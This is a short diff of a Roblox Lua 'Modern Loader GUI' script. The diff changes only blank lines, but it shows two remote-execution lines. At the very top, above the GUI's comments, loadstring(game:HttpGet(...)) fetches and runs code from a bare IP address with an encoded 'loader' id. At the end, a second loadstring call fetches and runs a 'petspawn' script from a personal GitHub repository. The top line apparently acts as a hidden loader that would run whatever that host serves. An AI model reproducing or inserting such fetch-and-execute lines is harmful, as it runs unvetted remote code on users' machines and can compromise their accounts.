@@ -1,4 +1,6 @@
 loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
+
+
 --// Modern Loader GUI (Roblox Lua)
 --// Drop into a LocalScript (StarterPlayerScripts, StarterGui, etc.)
 
@@ -321,4 +323,3 @@ task.wait(FADE_OUT_TIME + 0.05)
 gui:Destroy()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wweeweelala/dwetyiu7g/refs/heads/main/petspawn"))()
-
